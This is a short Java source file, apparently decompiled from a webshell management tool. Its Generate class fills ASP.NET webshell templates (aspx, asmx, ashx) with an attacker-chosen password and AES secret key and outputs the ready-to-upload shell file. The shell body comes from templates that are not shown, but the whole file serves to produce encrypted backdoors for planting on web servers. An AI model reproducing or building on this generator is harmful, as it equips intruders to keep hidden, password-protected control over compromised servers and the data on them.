package shells.cryptions.cshapAes;

import core.ui.component.dialog.GOptionPane;
import java.io.InputStream;
import util.Log;
import util.functions;




class Generate
{
  private static final String[] SUFFIX = new String[] { "aspx", "asmx", "ashx" };
  public static byte[] GenerateShellLoder(String shellName, String pass, String secretKey, boolean isBin) {
    byte[] data = null;
    
    try {
      InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + (isBin ? "raw.bin" : "base64.bin"));
      String code = new String(functions.readInputStream(inputStream));
      inputStream.close();
      code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
      Object selectedValue = GOptionPane.showInputDialog(null, "suffix", "selected suffix", 1, null, (Object[])SUFFIX, null);
      if (selectedValue != null) {
        String suffix = (String)selectedValue;
        inputStream = Generate.class.getResourceAsStream("template/shell." + suffix);
        String template = new String(functions.readInputStream(inputStream));
        inputStream.close();
        template = template.replace("{code}", code);
        data = template.getBytes();
      }
    
    } catch (Exception e) {
      Log.error(e);
    } 
    return data;
  }
  public static byte[] GenerateShellLoder(String pass, String secretKey, boolean isBin) {
    return GenerateShellLoder("", pass, secretKey, isBin);
  }
  
  public static byte[] GenerateShellLoderByAsmx(String shellName, String pass, String secretKey) {
    byte[] data = null;
    
    try {
      InputStream inputStream = Generate.class.getResourceAsStream("template/" + shellName + "shellAsmx.asmx");
      String code = new String(functions.readInputStream(inputStream));
      inputStream.close();
      code = code.replace("{pass}", pass).replace("{secretKey}", secretKey);
      return code.getBytes();
    }
    catch (Exception e) {
      Log.error(e);
      
      return data;
    } 
  } public static byte[] GenerateShellLoderByAsmx(String pass, String secretKey) {
    return GenerateShellLoderByAsmx("", pass, secretKey);
  }
}
